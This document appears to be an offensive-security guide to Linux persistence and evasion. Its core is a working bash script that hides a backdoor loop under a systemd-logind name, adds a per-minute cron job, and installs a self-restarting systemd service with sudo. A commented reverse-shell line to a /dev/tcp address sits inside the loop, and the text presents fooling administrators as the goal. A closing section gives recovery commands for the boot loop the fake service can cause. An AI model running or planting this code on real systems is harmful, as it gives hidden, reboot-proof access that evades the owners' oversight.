# Advanced Persistence & Evasion

## Overview
**Advanced Persistence** involves utilizing multiple layered techniques to maintain continuous, hidden access to a compromised system. This specific attack relies on masquerading—naming malicious payloads after legitimate system components (like `systemd-logind`) to hide in plain sight.

---

## Attacker's Gain
- **Continuous Access**: By leveraging Cron jobs and Systemd, the attacker ensures their payload survives system reboots.
- **Evasion**: Disguising traffic as `[kworker/4:3]` and naming services `systemd-logind` tricks administrators during casual process inspection.
- **Redundancy**: If the system administrator finds and kills the Cron job, the Systemd service will respawn the shell, and vice versa.

---

## The Attack Script
This unified payload drops a disguised process in a hidden directory, registers a cron job, and sets up a malicious systemd service.

```bash
#!/bin/bash

# Create a hidden staging directory
mkdir -p ~/.cache/.systemd 2>/dev/null

# Create the backdoor script with process masquerading
cat > ~/.cache/.systemd/systemd-logind.sh << 'EOF'
#!/bin/bash
while true; do
    sleep 60
    # Example: Reverse shell (change IP)
    # bash -i >& /dev/tcp/192.168.0.XXX/4444 0>&1
    echo "[kworker/4:3] heartbeat" >> /dev/null
done
EOF

chmod +x ~/.cache/.systemd/systemd-logind.sh

# Add to crontab stealthily
(crontab -l 2>/dev/null; echo "* * * * * ~/.cache/.systemd/systemd-logind.sh") | crontab -

# Create Systemd service persistence (Dangerous if conflicts occur)
cat > /tmp/systemd-logind.service << EOF
[Unit]
Description=System Logging Service

[Service]
ExecStart=/bin/bash $HOME/.cache/.systemd/systemd-logind.sh
Restart=always

[Install]
WantedBy=multi-user.target
EOF

sudo cp /tmp/systemd-logind.service /etc/systemd/system/ 2>/dev/null
sudo systemctl enable --now systemd-logind.service 2>/dev/null

echo "[+] Advanced persistence established"
```

---

## System Crash / Boot Loop Recovery

### Why It Cran Crash Ubuntu
Naming the malicious service `/etc/systemd/system/systemd-logind.service` conflicts with the *legitimate* Ubuntu login manager. This can cause the OS to fail during graphical login initialization, causing boot freezes or infinite recovery loops. 

### How to Restore the System
Should your machine lock up or fail to boot after running this attack, boot into the **Recovery Root Shell** (via GRUB Advanced Options) and execute the following commands precisely:

1. **Remount filesystem as Read/Write**:
   ```bash
   mount -o remount,rw /
   ```

2. **Disable and remove the fake service**:
   ```bash
   systemctl disable systemd-logind.service
   systemctl stop systemd-logind.service
   rm -f /etc/systemd/system/systemd-logind.service
   systemctl daemon-reload
   ```

3. **Remove Cron Persistence**:
   ```bash
   crontab -r  # Or use crontab -e to manually remove the specific line
   ```

4. **Delete the Hidden Payload**:
   ```bash
   rm -rf ~/.cache/.systemd
   ```

5. **Fix Package/System States and Reboot**:
   ```bash
   dpkg --configure -a
   apt --fix-broken install
   systemctl daemon-reexec
   reboot
   ```

To verify recovery, running `systemctl status systemd-logind` should now point to the legitimate binary at `/lib/systemd/system/systemd-logind.service`.